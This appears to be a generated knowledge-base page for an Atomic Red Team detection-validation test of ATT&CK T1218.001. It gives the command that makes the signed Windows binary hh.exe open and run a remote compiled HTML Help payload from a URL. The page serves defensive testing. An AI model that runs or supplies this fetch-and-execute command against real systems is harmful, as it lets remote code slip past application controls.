---
atomic_guid: "0f8af516-9818-4172-922b-42986ef1e81d"
title: "Compiled HTML Help Remote Payload"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.001"
attack_technique_name: "Signed Binary Proxy Execution: Compiled HTML File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "0f8af516-9818-4172-922b-42986ef1e81d"
  - "Compiled HTML Help Remote Payload"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Compiled HTML Help Remote Payload

Uses hh.exe to execute a remote compiled HTML Help payload.
Upon execution displays an error saying the file cannot be open

## Metadata

- Atomic GUID: 0f8af516-9818-4172-922b-42986ef1e81d
- Technique: T1218.001: Signed Binary Proxy Execution: Compiled HTML File
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1218.001/T1218.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.001]]

## Input Arguments

### remote_chm_file

- description: Remote .chm payload
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm

## Executor

- name: command_prompt

### Command

```commandprompt
hh.exe #{remote_chm_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.yaml)
